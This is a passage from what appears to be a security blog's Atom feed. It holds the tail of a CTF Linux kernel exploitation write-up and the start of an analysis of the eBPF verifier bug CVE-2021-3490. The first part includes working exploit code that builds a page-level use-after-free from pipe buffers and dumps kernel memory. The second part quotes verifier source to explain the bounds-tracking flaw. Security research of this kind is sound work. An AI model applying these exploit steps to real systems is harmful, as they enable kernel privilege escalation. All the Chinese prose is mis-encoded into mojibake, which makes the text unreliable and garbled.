class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æ¼æ´ä¿®å¤å…¶å®æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦æŠŠè¯»å–å¤±è´¥çš„åŸºæœ¬å—çš„è·³è½¬ç›®æ ‡æ”¹åˆ° <code>kfree()</code> ä¹‹åå³å¯ï¼š</p><p><img src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" alt="image.png"></p><h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03. æ€»ç»“"></a>0x03. æ€»ç»“</h1><p>æ„Ÿè§‰å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½æ€»ç»“çš„â€¦æ¯”è¾ƒæ²¡å•¥äº®ç‚¹çš„ä¸¤é“å¥—è·¯é¢˜ç½¢äº†â€¦</p><p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»å…¸å‡ºé¢˜æ²¡äººæ„¿æ„åš&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="CISCN" scheme="http://blog.arttnba3.cn/tags/CISCN/"/>
    
    <category term="UAF" scheme="http://blog.arttnba3.cn/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x0Aã€‘CVE-2021-3490 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2023/06/04/CVE-0X0A-CVE-2021-3490/"/>
    <id>http://blog.arttnba3.cn/2023/06/04/CVE-0X0A-CVE-2021-3490/</id>
    <published>2023-06-03T20:59:40.000Z</published>
    <updated>2023-06-12T21:01:10.465Z</updated>
    
    <content type="html"><![CDATA[<p>é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›æƒ³èµ·äº†è¢« VM Pwn æ”¯é…çš„ææ€–</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">CVE-2021-3490</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ eBPF verifier ä¸­çš„æ¼æ´ï¼Œç”±äº eBPF verifier åœ¨æ ¡éªŒä½è¿ç®—æ“ä½œï¼ˆ ä¸ã€æˆ–ã€å¼‚æˆ– ï¼‰æ—¶æ²¡æœ‰æ­£ç¡®åœ°æ›´æ–°å¯„å­˜å™¨çš„ 32 ä½è¾¹ç•Œï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ å‡ºéæ³•çš„è¿è¡Œæ—¶å¯„å­˜å™¨å€¼ä»¥è¿›è¡Œææƒï¼›è¯¥æ¼æ´åœ¨ <a href="https://lore.kernel.org/bpf/158560419880.10843.11448220440809118343.stgit@john-Precision-5820-Tower/">è¿™ä¸ª commit</a> ä¸­è¢«å¼•å…¥ï¼Œåœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">è¿™ä¸ª commit</a> ä¸­è¢«ä¿®å¤</p><p>æœ¬æ–‡æˆ‘ä»¬é€‰æ‹©å†…æ ¸ç‰ˆæœ¬ <code>5.11.16</code> è¿›è¡Œåˆ†æ</p><blockquote><p>æ³¨ï¼šeBPF ç›¸å…³åŸºç¡€çŸ¥è¯†å¯ä»¥çœ‹<a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">è¿™â†‘é‡Œâ†“</a></p></blockquote><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><p>eBPF æŒ‡ä»¤çš„åˆæ³•æ€§æ ¡éªŒé€šè¿‡ eBPF verifier å®Œæˆï¼ŒeBPF verifier çš„æ ¸å¿ƒå‡½æ•°ä¾¿æ˜¯ <code>do_check()</code>ï¼Œè¯¥å‡½æ•°ä¼šéå†æ¯ä¸€æ¡æŒ‡ä»¤å¹¶æ ¹æ®æŒ‡ä»¤çš„ä¸åŒç±»å‹è¿›è¡Œä¸åŒæ“ä½œï¼Œå¯¹äºç®—æœ¯æŒ‡ä»¤ï¼ˆ<code>BPF_ALU</code> &#x2F; <code>BPF_ALU64</code>ï¼‰è€Œè¨€æœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">do_check</span>()<span class="hljs-comment">// éå†æ¯ä¸€æ¡æŒ‡ä»¤å¹¶æ ¹æ®ç±»å‹è°ƒç”¨ç›¸åº”å‡½æ•°å¤„ç†</span><br><span class="hljs-built_in">check_alu_op</span>()<span class="hljs-comment">// æ ¹æ®ç®—æœ¯æŒ‡ä»¤çš„ opcode è¿›è¡Œä¸åŒå¤„ç†</span><br><span class="hljs-built_in">adjust_reg_min_max_vals</span>()<span class="hljs-comment">// è®¡ç®—æ–°çš„å¯„å­˜å™¨è¾¹ç•Œå€¼</span><br><span class="hljs-built_in">adjust_scalar_min_max_vals</span>()<span class="hljs-comment">// æ ¹æ® opcode è®¡ç®—å…·ä½“çš„æ–°è¾¹ç•Œå€¼</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>adjust_scalar_min_max_vals()</code> å‡½æ•°å½“ä¸­ä¼šå¯¹ 32 ä½ä¸ 64 ä½éƒ½è¿›è¡Œè¾¹ç•Œæ ¡éªŒï¼ˆå› ä¸ºå®é™…å‚ä¸è¿ç®—çš„å¯èƒ½æ˜¯ 32 ä¹Ÿå¯èƒ½æ˜¯ 64ï¼‰ï¼Œè®¡ç®—è¾¹ç•Œå€¼çš„é€»è¾‘ä¸»è¦æ˜¯å…ˆè°ƒç”¨ <code>scalar32_min_max_xor()</code> è®¡ç®— 32 ä½è¾¹ç•Œå€¼å†è°ƒç”¨ <code>scalar_min_max_xor()</code> è®¡ç®— 64 ä½è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: è¯¥å‡½æ•°åœ¨ 64 ä½å€¼ä¸Šè¿›è¡Œè®¡ç®—ï¼Œä½†å®é™…æ‰§è¡Œå¯èƒ½åœ¨ 32 ä½å€¼ä¸Šï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤åœ¨ 32 ä½çš„æƒ…å†µä¸‹ï¼Œè¯¸å¦‚ä½ç§»ç­‰éœ€è¦é¢å¤–çš„æ£€æŸ¥.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_scalar_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state src_reg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_AND:<br>dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_and(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_and(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_OR:<br>dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_or(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_or(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_XOR:<br>dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_xor(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_xor(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<span class="hljs-comment">//æ›´æ–°è¾¹ç•Œ</span><br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ›´æ–° 32 ä½è¾¹ç•Œå€¼æ—¶å¼€å‘è€…è®¤ä¸ºå¦‚æœä¸¤ä¸ªå¯„å­˜å™¨çš„ä½ 32 ä½éƒ½ä¸º <code>known</code> é‚£å°±å¯ä»¥<strong>ç›´æ¥è·³è¿‡</strong>ï¼Œå› ä¸º 64 ä½æ—¶è¿˜ä¼šè¿›è¡Œæ›´æ–°ï¼š</p><blockquote><p><code>tnum_subreg_is_const()</code> ä¼šçœ‹å¯„å­˜å™¨çš„ <code>var_off</code> çš„ mask çš„ä½ 32 ä½æ˜¯å¦ä¸º 0ï¼ˆå³å…¨éƒ¨å·²çŸ¥ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-comment">/* å‡è®¾ scalar64_min_max_and å°†è¢«è°ƒç”¨ï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤è·³è¿‡ä¸ºå·²çŸ¥çš„ 32ä½æƒ…å†µæ›´æ–°å¯„å­˜å™¨æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>åœ¨æ›´æ–° 64 ä½è¾¹ç•Œå€¼æ—¶è‹¥ä¸¤ä¸ªå¯„å­˜å™¨éƒ½ä¸º <code>known</code> å°±ç›´æ¥è°ƒç”¨ <code>__mark_reg_known()</code> <strong>å°†å¯„å­˜å™¨æ ‡ä¸º</strong> <code>known</code> <strong>å¹¶ç›´æ¥è¿”å›</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);<br>s64 smin_val = src_reg-&gt;smin_value;<br>u64 umax_val = src_reg-&gt;umax_value;<br><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) &#123;<br>__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p><code>__mark_reg_known()</code> å…¶å®å°±æ˜¯ç®€å•çš„è°ƒç”¨ <code>tnum_const()</code> è®¾ç½®å¯„å­˜å™¨ <code>var_off</code> ä¸º <code>known</code> ï¼Œå¹¶ç»™å¯¹åº”è¾¹ç•Œèµ‹å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> ___mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br>reg-&gt;var_off = tnum_const(imm);<br>reg-&gt;smin_value = (s64)imm;<br>reg-&gt;smax_value = (s64)imm;<br>reg-&gt;umin_value = imm;<br>reg-&gt;umax_value = imm;<br><br>reg-&gt;s32_min_value = (s32)imm;<br>reg-&gt;s32_max_value = (s32)imm;<br>reg-&gt;u32_min_value = (u32)imm;<br>reg-&gt;u32_max_value = (u32)imm;<br>&#125;<br><br><span class="hljs-comment">/* æ ‡è®°ä¸€ä¸ªå¯„å­˜å™¨çš„æœªçŸ¥éƒ¨åˆ† (å˜é‡åç§»æˆ–æ ‡é‡å€¼) </span><br><span class="hljs-comment"> * ä¸ºå·²çŸ¥çš„å€¼ @imm.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br><span class="hljs-comment">/* Clear id, off, and union(map_ptr, range) */</span><br><span class="hljs-built_in">memset</span>(((u8 *)reg) + <span class="hljs-keyword">sizeof</span>(reg-&gt;type), <span class="hljs-number">0</span>,<br>       offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off) - <span class="hljs-keyword">sizeof</span>(reg-&gt;type));<br>___mark_reg_known(reg, imm);<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><p>ä½†è¿™æ ·å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œ<strong>è‹¥å­˜åœ¨ä¸€ä¸ªé«˜ 32 ä½ unknown çš„å¯„å­˜å™¨ï¼Œåˆ™ä¸ä¼šè°ƒç”¨</strong> <code>__mark_reg_known()</code> <strong>æ›´æ–° 32 ä½çš„è¾¹ç•Œå€¼ï¼Œè€Œåªä¼šæ›´æ–° 64 ä½è¾¹ç•Œå€¼</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* æˆ‘ä»¬ä» var_off ä¸­è·å–æœ€å°å€¼, å› ä¸ºå…¶æœ¬è´¨ä¸Šæ˜¯æŒ‰ä½çš„.</span><br><span class="hljs-comment"> * æˆ‘ä»¬çš„æœ€å¤§å€¼ä¸ºæ“ä½œæ•°ä¸­æ‰€æœ‰æœ€å¤§å€¼çš„æœ€å°å€¼.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;<br>dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);<br><span class="hljs-keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="hljs-number">0</span> || smin_val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* åœ¨åŠ ä¸Šè´Ÿå€¼æ—¶ä¼šä¸¢å¤±æœ‰ç¬¦å·çš„èŒƒå›´ï¼Œ</span><br><span class="hljs-comment"> * æ²¡äººæœ‰æ—¶é—´æè¿™ä¸ª.  // è¯‘æ³¨ï¼šåŸæ–‡å¦‚æ­¤</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = S64_MIN;<br>dst_reg-&gt;smax_value = S64_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* ä¸¤ä¸ªæ­£å€¼åšä¸è¿˜æ˜¯æ­£å€¼, </span><br><span class="hljs-comment"> * æ•…å¯ä»¥å¾ˆå®‰å…¨åœ°å°†ç»“æœè½¬ä¸º s64.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;<br>dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;<br>&#125;<br><span class="hljs-comment">/* æˆ‘ä»¬å¯èƒ½ä» var_off ä¸­è·å–åˆ°æ›´å¤š */</span><br>__update_reg_bounds(dst_reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…ä¸¾ä¸€ä¸ªéå¸¸ç®€å•çš„<del>å¹¶ä¸”å·²ç»åœ¨å…¶ä»–å„å¤§å¸ˆå‚…çš„æ¼æ´åˆ†æçš„æ–‡ç« é‡Œç”¨çƒ‚äº†çš„</del>ä¾‹å­ï¼š</p><ul><li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;;</code> ï¼šè¯¥å¯„å­˜å™¨ä½ 32 ä½å€¼å·²çŸ¥ä¸º 1ï¼Œé«˜ 32 ä½ä¸ç¡®å®š</li><li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;;</code> ï¼šè¯¥å¯„å­˜å™¨ 64 ä½å€¼å…¨éƒ¨å·²çŸ¥ï¼Œä¸º <code>0x100000002</code></li></ul><p>å‡å¦‚æˆ‘ä»¬å°† R2 ä¸ R3 åšä¸è¿ç®—ï¼Œåœ¨åˆšè¿›å…¥ switch æ—¶ä¼šå…ˆè°ƒç”¨ <code>tnum_and()</code> è¿›è¡Œè®¡ç®—å¹¶å°†ç»“æ„ä¿å­˜åˆ° <code>R2-&gt;var_off</code>ï¼Œç”±äº R3 å…¨éƒ¨ç¡®å®šè€Œ R2 çš„é«˜ 32 ä½ä¸ç¡®å®šï¼Œå› æ­¤è¿ç®—ç»“æœä¸º <code>&#123; .value = 0x0, .mask = 0x100000000 &#125;</code>ï¼Œå³ä»…æœ‰ç¬¬ 32 ä½æ˜¯ä¸ç¡®å®šçš„</p><p>æ¥ä¸‹æ¥ç»§ç»­å›åˆ° <code>scalar_min_max_and()</code>ä¸­ï¼Œè¯¥å‡½æ•°æœ€åä¼šè°ƒç”¨ <code>__update_reg_bounds()</code> å¯¹æ¯”å¯„å­˜å™¨çš„ <code>var_off</code> å¹¶æ›´æ–°è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg32_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);<br><br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;s32_min_value = <span class="hljs-type">max_t</span>(s32, reg-&gt;s32_min_value,<br>var32_off.value | (var32_off.mask &amp; S32_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;s32_max_value = <span class="hljs-type">min_t</span>(s32, reg-&gt;s32_max_value,<br>var32_off.value | (var32_off.mask &amp; S32_MAX));<br>reg-&gt;u32_min_value = <span class="hljs-type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);<br>reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,<br> (u32)(var32_off.value | var32_off.mask));<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg64_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;smin_value = <span class="hljs-type">max_t</span>(s64, reg-&gt;smin_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;smax_value = <span class="hljs-type">min_t</span>(s64, reg-&gt;smax_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));<br>reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);<br>reg-&gt;umax_value = min(reg-&gt;umax_value,<br>      reg-&gt;var_off.value | reg-&gt;var_off.mask);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__update_reg32_bounds(reg);<br>__update_reg64_bounds(reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>æœ€å°è¾¹ç•Œå€¼ &#x3D; ã€<code>min_value</code> ã€ <code>var_off</code> å·²çŸ¥å€¼ã€‘ä¸­çš„æœ€å¤§è€…</li><li>æœ€å¤§è¾¹ç•Œå€¼ &#x3D;ã€ <code>max_value</code> ã€ <code>var_off</code> å·²çŸ¥å€¼ã€‘ä¸­çš„æœ€å°è€…</li></ul><p>ç”±äº R2 çš„ 32 ä½åˆå§‹è¾¹ç•Œå€¼æœªç»è¿‡æ›´æ–°ï¼Œä»ä¸ºå…¶åŸå€¼ <code>1</code>ï¼Œå› æ­¤ç»è¿‡è¯¥è½®è®¡ç®—ä¹‹å R2 çš„<strong>æœ€å°å€¼ä¸º 1ï¼Œæœ€å¤§å€¼ä¸º 0</strong>ï¼Œè€Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆç†çš„</p><p>å›åˆ°  <code>adjust_scalar_min_max_vals()</code> ä¸­ï¼Œå…¶æœ€åä¹Ÿä¼šè°ƒç”¨ <code>__update_reg_bounds()</code> å¯¹æ¯”å¯„å­˜å™¨çš„ <code>var_off</code> å¹¶æ›´æ–°è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 